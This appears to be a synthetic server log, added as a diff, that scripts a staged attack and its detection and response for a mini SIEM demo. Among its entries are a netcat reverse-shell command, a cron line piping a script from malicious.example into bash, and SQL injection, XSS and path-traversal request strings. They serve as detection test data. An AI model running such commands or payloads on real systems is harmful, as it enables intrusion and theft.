@@ -1,0 +1,229 @@
+Jul 20 09:00:01 server sshd[1001]: Accepted password for devansh from 192.168.1.15 port 51001 ssh2
+Jul 20 09:00:12 server sshd[1002]: Accepted password for admin from 192.168.1.20 port 51002 ssh2
+Jul 20 09:00:24 server sshd[1003]: Accepted password for ubuntu from 192.168.1.21 port 51003 ssh2
+Jul 20 09:00:36 server sshd[1004]: Accepted publickey for devansh from 192.168.1.15 port 51004 ssh2
+Jul 20 09:00:48 server sshd[1005]: Accepted password for backup from 192.168.1.30 port 51005 ssh2
+
+Jul 20 09:01:00 server sshd[2001]: Failed password for invalid user root from 185.220.101.45 port 42001 ssh2
+Jul 20 09:01:03 server sshd[2002]: Failed password for invalid user admin from 185.220.101.45 port 42002 ssh2
+Jul 20 09:01:06 server sshd[2003]: Failed password for invalid user test from 185.220.101.45 port 42003 ssh2
+Jul 20 09:01:09 server sshd[2004]: Failed password for invalid user oracle from 185.220.101.45 port 42004 ssh2
+Jul 20 09:01:12 server sshd[2005]: Failed password for invalid user guest from 185.220.101.45 port 42005 ssh2
+Jul 20 09:01:15 server sshd[2006]: Failed password for invalid user root from 185.220.101.45 port 42006 ssh2
+Jul 20 09:01:18 server sshd[2007]: Failed password for invalid user admin from 185.220.101.45 port 42007 ssh2
+Jul 20 09:01:21 server sshd[2008]: Failed password for invalid user ubuntu from 185.220.101.45 port 42008 ssh2
+Jul 20 09:01:24 server sshd[2009]: Failed password for invalid user test from 185.220.101.45 port 42009 ssh2
+Jul 20 09:01:27 server sshd[2010]: Failed password for invalid user root from 185.220.101.45 port 42010 ssh2
+Jul 20 09:01:30 server sshd[2011]: Failed password for invalid user admin from 185.220.101.45 port 42011 ssh2
+Jul 20 09:01:33 server sshd[2012]: Failed password for invalid user guest from 185.220.101.45 port 42012 ssh2
+Jul 20 09:01:36 server sshd[2013]: Failed password for invalid user ubuntu from 185.220.101.45 port 42013 ssh2
+Jul 20 09:01:39 server sshd[2014]: Failed password for invalid user test from 185.220.101.45 port 42014 ssh2
+Jul 20 09:01:42 server sshd[2015]: Failed password for invalid user root from 185.220.101.45 port 42015 ssh2
+Jul 20 09:01:45 server sshd[2016]: Failed password for invalid user admin from 185.220.101.45 port 42016 ssh2
+Jul 20 09:01:48 server sshd[2017]: Failed password for invalid user oracle from 185.220.101.45 port 42017 ssh2
+Jul 20 09:01:51 server sshd[2018]: Failed password for invalid user guest from 185.220.101.45 port 42018 ssh2
+Jul 20 09:01:54 server sshd[2019]: Failed password for invalid user root from 185.220.101.45 port 42019 ssh2
+Jul 20 09:01:57 server sshd[2020]: Failed password for invalid user admin from 185.220.101.45 port 42020 ssh2
+
+Jul 20 09:02:05 server sshd[2050]: Accepted password for root from 185.220.101.45 port 43000 ssh2
+
+Jul 20 09:02:15 server sudo: devansh : TTY=pts/0 ; PWD=/home/devansh ; USER=root ; COMMAND=/bin/bash
+Jul 20 09:02:25 server useradd[3001]: new user: name=backup uid=1002 gid=1002 home=/home/backup shell=/bin/bash
+
+Jul 20 09:02:35 server kernel: IPTables-Dropped: IN=eth0 OUT= MAC= SRC=103.56.22.90 DST=10.0.0.5 LEN=60 PROTO=TCP SPT=45622 DPT=22
+
+Jul 20 09:02:45 server apache2: 103.56.22.90 - - "GET /login.php?id=1' OR '1'='1 HTTP/1.1" 403
+Jul 20 09:02:55 server apache2: 103.56.22.90 - - "GET /search?q=<script>alert(1)</script> HTTP/1.1" 403
+Jul 20 09:03:05 server apache2: 103.56.22.90 - - "GET /../../../../etc/passwd HTTP/1.1" 403
+
+Jul 20 09:03:15 server auditd: Suspicious executable detected: /tmp/revshell.sh executed by uid=0
+Jul 20 09:03:20 server auditd: Suspicious process nc -e /bin/bash 185.220.101.45:4444
+
+Jul 20 09:03:30 server threatintel: IOC_MATCH IP=185.220.101.45 Feed=AbuseIPDB Confidence=98
+Jul 20 09:03:35 server threatintel: IOC_MATCH HASH=5f4dcc3b5aa765d61d8327deb882cf99
+
+Jul 20 09:03:45 server detection: Technique=T1110 Brute Force Severity=Critical
+Jul 20 09:03:50 server detection: Technique=T1059 Command and Scripting Interpreter Severity=High
+Jul 20 09:03:55 server detection: Technique=T1078 Valid Accounts Severity=High
+Jul 20 09:04:00 server incident: Correlation Engine linked SSH Brute Force + Privilege Escalation + IOC Match -> Critical Incident
+
+Jul 20 09:04:10 server kernel: Firewall Alert: Port scan detected from 45.155.205.233 targeting ports 21,22,23,25,53,80,110,143,443
+Jul 20 09:04:15 server kernel: Connection limit exceeded for 45.155.205.233
+Jul 20 09:04:20 server fail2ban.actions[4011]: NOTICE [sshd] Ban 45.155.205.233
+Jul 20 09:04:25 server fail2ban.actions[4012]: NOTICE [sshd] Ban 185.220.101.45
+
+Jul 20 09:04:35 server apache2: 45.155.205.233 - - "GET /wp-admin HTTP/1.1" 404
+Jul 20 09:04:38 server apache2: 45.155.205.233 - - "GET /.env HTTP/1.1" 403
+Jul 20 09:04:41 server apache2: 45.155.205.233 - - "GET /.git/config HTTP/1.1" 403
+Jul 20 09:04:44 server apache2: 45.155.205.233 - - "GET /admin HTTP/1.1" 403
+Jul 20 09:04:47 server apache2: 45.155.205.233 - - "GET /phpmyadmin HTTP/1.1" 403
+
+Jul 20 09:05:00 server apache2: 103.56.22.90 - - "POST /login HTTP/1.1" 401
+Jul 20 09:05:04 server apache2: 103.56.22.90 - - "POST /login HTTP/1.1" 401
+Jul 20 09:05:08 server apache2: 103.56.22.90 - - "POST /login HTTP/1.1" 401
+Jul 20 09:05:12 server apache2: 103.56.22.90 - - "POST /login HTTP/1.1" 200
+
+Jul 20 09:05:20 server auditd: File /etc/passwd modified by uid=0
+Jul 20 09:05:25 server auditd: File /etc/shadow accessed by uid=0
+Jul 20 09:05:30 server auditd: File /var/www/html/config.php modified
+
+Jul 20 09:05:40 server systemd: New service suspicious-backdoor.service enabled
+Jul 20 09:05:45 server systemd: suspicious-backdoor.service started successfully
+
+Jul 20 09:05:55 server malware: Trojan.Generic detected in /tmp/payload.bin
+Jul 20 09:06:00 server malware: Reverse shell behavior detected
+Jul 20 09:06:05 server malware: Persistence mechanism created using cron
+
+Jul 20 09:06:15 server cron: root CMD (/tmp/revshell.sh)
+Jul 20 09:06:20 server cron: root CMD (curl http://malicious.example/payload.sh | bash)
+
+Jul 20 09:06:30 server dns: Suspicious DNS query xyz-malware-domain.com from 10.0.0.5
+Jul 20 09:06:35 server dns: DNS tunneling suspected for attacker.example
+
+Jul 20 09:06:45 server netflow: Large outbound transfer detected 2.4GB to 91.210.169.55
+Jul 20 09:06:50 server netflow: Possible Data Exfiltration
+
+Jul 20 09:07:00 server threatintel: IOC_MATCH DOMAIN=xyz-malware-domain.com Confidence=99
+Jul 20 09:07:05 server threatintel: IOC_MATCH HASH=e99a18c428cb38d5f260853678922e03
+
+Jul 20 09:07:15 server mitre: T1046 Network Service Discovery
+Jul 20 09:07:20 server mitre: T1053 Scheduled Task
+Jul 20 09:07:25 server mitre: T1105 Ingress Tool Transfer
+Jul 20 09:07:30 server mitre: T1071 Application Layer Protocol
+Jul 20 09:07:35 server mitre: T1041 Exfiltration Over C2 Channel
+
+Jul 20 09:07:45 server correlation: Port Scan + Brute Force + Web Attack + Malware + IOC + DNS Tunnel = CRITICAL INCIDENT
+Jul 20 09:07:55 server incident: Severity=Critical Score=98 Status=Open
+
+Jul 20 09:08:00 server smbd[5001]: Anonymous SMB connection attempt from 172.16.10.55
+Jul 20 09:08:05 server smbd[5002]: Failed authentication for Administrator from 172.16.10.55
+Jul 20 09:08:10 server smbd[5003]: Multiple SMB authentication failures detected
+
+Jul 20 09:08:20 server vpn: Successful VPN login for devansh from India (Lucknow)
+Jul 20 09:08:30 server vpn: Successful VPN login for devansh from Russia (Moscow)
+Jul 20 09:08:35 server anomaly: Impossible travel detected for user devansh
+
+Jul 20 09:08:45 server kernel: USB Mass Storage device inserted
+Jul 20 09:08:50 server auditd: Sensitive files copied to /media/USB_DRIVE
+
+Jul 20 09:09:00 server kernel: High CPU usage detected 98%
+Jul 20 09:09:05 server kernel: High Memory usage detected 96%
+Jul 20 09:09:10 server kernel: Disk usage reached 99%
+
+Jul 20 09:09:20 server malware: Ransomware behavior detected
+Jul 20 09:09:25 server malware: Multiple files encrypted in /home/devansh/Documents
+Jul 20 09:09:30 server malware: Encryption extension .locked observed
+Jul 20 09:09:35 server malware: Ransom note detected README_RECOVER_FILES.txt
+
+Jul 20 09:09:45 server auditd: chmod 777 executed on /etc/shadow
+Jul 20 09:09:50 server auditd: Unauthorized root shell started
+
+Jul 20 09:10:00 server sshd[7001]: Accepted password for backup from 185.220.101.45 port 44001 ssh2
+Jul 20 09:10:05 server sshd[7002]: Accepted password for database from 185.220.101.45 port 44002 ssh2
+Jul 20 09:10:10 server lateral: Possible lateral movement detected
+
+Jul 20 09:10:20 server apache2: 45.155.205.233 - - "GET /admin/config.php HTTP/1.1" 403
+Jul 20 09:10:25 server apache2: 45.155.205.233 - - "GET /backup.zip HTTP/1.1" 404
+Jul 20 09:10:30 server apache2: 45.155.205.233 - - "POST /upload.php HTTP/1.1" 500
+
+Jul 20 09:10:40 server netflow: Outbound traffic spike 4.8GB detected
+Jul 20 09:10:45 server netflow: Destination IP 185.199.108.153
+
+Jul 20 09:10:55 server threatintel: IOC_MATCH URL=http://malicious.example/payload.sh
+Jul 20 09:11:00 server threatintel: IOC_MATCH FILE=/tmp/payload.bin
+
+Jul 20 09:11:10 server mitre: T1021 Remote Services
+Jul 20 09:11:15 server mitre: T1486 Data Encrypted for Impact
+Jul 20 09:11:20 server mitre: T1005 Data from Local System
+Jul 20 09:11:25 server mitre: T1078 Valid Accounts
+Jul 20 09:11:30 server mitre: T1055 Process Injection
+
+Jul 20 09:11:40 server ai_assistant: High confidence attack chain detected
+Jul 20 09:11:45 server ai_assistant: Recommended immediate host isolation
+Jul 20 09:11:50 server ai_assistant: Block attacker IPs 185.220.101.45 and 45.155.205.233
+Jul 20 09:11:55 server ai_assistant: Reset compromised credentials
+
+Jul 20 09:12:05 server incident_response: Kill malicious process
+Jul 20 09:12:10 server incident_response: Disable compromised accounts
+Jul 20 09:12:15 server incident_response: Restore files from backup
+Jul 20 09:12:20 server incident_response: Notify SOC Team
+
+Jul 20 09:12:30 server correlation: Brute Force + VPN Anomaly + Malware + Ransomware + Data Exfiltration + IOC = SEVERITY CRITICAL (99/100)
+Jul 20 09:12:40 server report: PDF Report Generated
+Jul 20 09:12:45 server report: CSV Report Generated
+Jul 20 09:12:50 server history: Scan stored successfully in database
+
+Jul 20 09:13:00 server edr: Endpoint Isolation initiated for host web01
+Jul 20 09:13:05 server firewall: Block rule added for 185.220.101.45
+Jul 20 09:13:10 server firewall: Block rule added for 45.155.205.233
+Jul 20 09:13:15 server ids: Active attack traffic dropped
+
+Jul 20 09:13:25 server backup: Latest backup integrity verified
+Jul 20 09:13:30 server backup: Recovery process started
+Jul 20 09:13:35 server backup: Critical files restored successfully
+
+Jul 20 09:13:45 server antivirus: Full system scan initiated
+Jul 20 09:13:50 server antivirus: Trojan.Generic removed
+Jul 20 09:13:55 server antivirus: Reverse shell process terminated
+Jul 20 09:14:00 server antivirus: No active malware remaining
+
+Jul 20 09:14:10 server iam: Password reset enforced for root
+Jul 20 09:14:15 server iam: Password reset enforced for devansh
+Jul 20 09:14:20 server iam: MFA enabled for privileged accounts
+
+Jul 20 09:14:30 server monitoring: CPU utilization returned to 18%
+Jul 20 09:14:35 server monitoring: Memory utilization returned to 42%
+Jul 20 09:14:40 server monitoring: Network traffic normalized
+
+Jul 20 09:14:50 server threatintel: IOC status updated to Blocked
+Jul 20 09:14:55 server threatintel: Threat feed synchronized successfully
+
+Jul 20 09:15:05 server mitre: Technique T1110 (Brute Force) Confirmed
+Jul 20 09:15:10 server mitre: Technique T1059 (Command & Scripting Interpreter) Confirmed
+Jul 20 09:15:15 server mitre: Technique T1078 (Valid Accounts) Confirmed
+Jul 20 09:15:20 server mitre: Technique T1486 (Data Encrypted for Impact) Confirmed
+Jul 20 09:15:25 server mitre: Technique T1041 (Exfiltration Over C2 Channel) Confirmed
+
+Jul 20 09:15:35 server ai_assistant: Attack confidence = 99%
+Jul 20 09:15:40 server ai_assistant: Estimated attack duration = 15 minutes
+Jul 20 09:15:45 server ai_assistant: Risk Level = CRITICAL
+Jul 20 09:15:50 server ai_assistant: Recommended action = Host Isolation, Password Reset, IOC Blocking, Backup Restore
+
+Jul 20 09:16:00 server incident_response: Evidence collected
+Jul 20 09:16:05 server incident_response: Memory dump saved
+Jul 20 09:16:10 server incident_response: Logs archived
+Jul 20 09:16:15 server incident_response: Incident assigned to SOC Team
+
+Jul 20 09:16:25 server correlation: Multi-stage attack chain completed
+Jul 20 09:16:30 server correlation: Initial Access -> Brute Force
+Jul 20 09:16:35 server correlation: Persistence -> Scheduled Task
+Jul 20 09:16:40 server correlation: Privilege Escalation -> sudo
+Jul 20 09:16:45 server correlation: Credential Access -> Valid Accounts
+Jul 20 09:16:50 server correlation: Discovery -> Port Scan
+Jul 20 09:16:55 server correlation: Lateral Movement -> Remote Services
+Jul 20 09:17:00 server correlation: Collection -> Sensitive File Access
+Jul 20 09:17:05 server correlation: Exfiltration -> Large Outbound Transfer
+Jul 20 09:17:10 server correlation: Impact -> Ransomware Activity
+
+Jul 20 09:17:20 server report: Executive Summary Generated
+Jul 20 09:17:25 server report: Technical Analysis Completed
+Jul 20 09:17:30 server report: PDF Report Saved
+Jul 20 09:17:35 server report: CSV Report Saved
+
+Jul 20 09:17:45 server history: Scan ID = HAWK-20260720-001
+Jul 20 09:17:50 server history: Threat Score = 99/100
+Jul 20 09:17:55 server history: Overall Severity = CRITICAL
+Jul 20 09:18:00 server history: Status = Investigation Completed
+
+Jul 20 09:18:10 server summary: SSH Brute Force = TRUE
+Jul 20 09:18:15 server summary: SQL Injection = TRUE
+Jul 20 09:18:20 server summary: XSS = TRUE
+Jul 20 09:18:25 server summary: Directory Traversal = TRUE
+Jul 20 09:18:30 server summary: IOC Match = TRUE
+Jul 20 09:18:35 server summary: Malware = TRUE
+Jul 20 09:18:40 server summary: Ransomware = TRUE
+Jul 20 09:18:45 server summary: Data Exfiltration = TRUE
+Jul 20 09:18:50 server summary: MITRE Mapping = TRUE
+Jul 20 09:18:55 server summary: Incident Response = TRUE
+Jul 20 09:19:00 server summary: AI Analysis = COMPLETE
+Jul 20 09:19:05 server summary: HawkEye Mini SIEM Analysis Finished Successfully
